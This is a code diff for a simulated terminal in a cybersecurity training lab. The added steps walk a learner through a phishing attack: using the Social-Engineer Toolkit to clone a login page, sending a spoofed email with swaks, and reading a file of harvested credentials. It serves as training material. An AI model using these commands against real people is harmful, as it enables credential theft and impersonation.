+      { i:"Launch the Social Engineering Toolkit.", h:"Type <code>setoolkit</code>", v:c=>/^setoolkit$/i.test(c), o:"[*] Social-Engineer Toolkit (SET) starting...\nSelect from the menu:\n1) Social-Engineering Attacks\n2) Penetration Testing (Fast-Track)\n3) Third Party Modules\n4) Update the Metasploit Framework\n5) Update SET\n6) Help, Credits, and About\n\n99) Exit the Social-Engineer Toolkit", s:"SET launched." },
+      { i:"Select 'Social-Engineering Attacks'.", h:"Type <code>1</code>", v:c=>/^1$/i.test(c.trim()), o:"1) Spear-Phishing Attack Vectors\n2) Website Attack Vectors\n3) Infectious Media Generator\n4) Create a Payload and Listener\n5) Mass Mailer Attack\n6) Arduino-Based Attack Vector\n7) Wireless Access Point Attack Vector\n8) QRCode Generator Attack Vector\n9) Powershell Attack Vectors\n10) Third Party Modules\n\n99) Return back to the previous menu.", s:"Selected Social-Engineering Attacks." },
+      { i:"Select 'Website Attack Vectors'.", h:"Type <code>2</code>", v:c=>/^2$/i.test(c.trim()), o:"1) Java Applet Attack Method\n2) Metasploit Browser Exploit Method\n3) Credential Harvester Attack Method\n4) Tabnabbing Attack Method\n5) Man Left in the Middle Attack Method\n6) Web Jacking Attack Method\n7) Multi-Attack Web Method\n8) HTA Attack Method\n\n99) Return to Main Menu.", s:"Selected Website Attack Vectors." },
+      { i:"Select 'Credential Harvester Attack Method'.", h:"Type <code>3</code>", v:c=>/^3$/i.test(c.trim()), o:"1) Web Templates\n2) Site Cloner\n3) Custom Import\n\n99) Return to Webattack Menu", s:"Selected Credential Harvester." },
+      { i:"Select 'Site Cloner' to copy a real login page.", h:"Type <code>2</code>", v:c=>/^2$/i.test(c.trim()), o:"[-] Credential harvester will allow you to utilize the clone capabilities within SET\n[-] to clone a website and harvest credentials.\n\nIP address for the POST back in Harvester/Cloner:10.10.10.10", s:"Site Cloner selected." },
+      { i:"Use Swaks to send a phishing email pointing users to your cloned site.", h:"Type <code>swaks --to victim@corp.local --from admin@corp.local --server 10.10.10.5 --body \"Click here: http://10.10.10.10\"</code>", v:c=>/swaks\s+--to\s+.*--from\s+.*--server\s+10\.10\.10\.5\s+--body/i.test(c), o:"<~* To: victim@corp.local\n<~* From: admin@corp.local\n<~* Server: 10.10.10.5\n-> Date: ...\n-> Subject: Important Account Update\n-> Click here: http://10.10.10.10\n\n[*] Email sent successfully.", s:"Phishing email sent." },
+      { i:"Check the SET harvester file for captured credentials.", h:"Type <code>cat /root/.set/harvester.txt</code>", v:c=>/cat\s+\/root\/\.set\/harvester\.txt/i.test(c), o:"[*] WE GOT CREDENTIALS!\n\nUsername: victim@corp.local\nPassword: Summer2024!", s:"Credentials captured! Victim entered their password on your cloned site." }
     ]
   }
 ];
@@ -215,20 +320,18 @@ function loadLab(idx) {
   ObjList.innerHTML = lab.objectives.map(o => `<li>${o}</li>`).join('');
   NextBtn.innerHTML = lab.nextBtnText;
   
-  // Update sidebar active states
   document.querySelectorAll('.lab-item').forEach((el, i) => {
     el.classList.remove('active');
     if(completedLabs.has(i)) el.classList.add('done');
     if(i === idx) el.classList.add('active');
   });
 
-  // Handle Next Button visibility/action
-  if (idx === 3) {
+  if (idx === LABS.length - 1) {
     NextBtn.onclick = () => window.location.href = 'paid-cybersecurity-course.html';
   } else {
     NextBtn.onclick = () => loadLab(idx + 1);
   }
-  NextBtn.style.display = 'none'; // Hide until lab is complete
+  NextBtn.style.display = 'none';
 
   initTerminal();
 }
@@ -337,7 +440,7 @@ function completeLab() {
   document.querySelectorAll('.lab-item')[currentLab].classList.add('done');
   CompletedCount.innerText = completedLabs.size;
   
-  NextBtn.style.display = 'inline-flex'; // Show next button
+  NextBtn.style.display = 'inline-flex';
 }
 
 function showSol() {
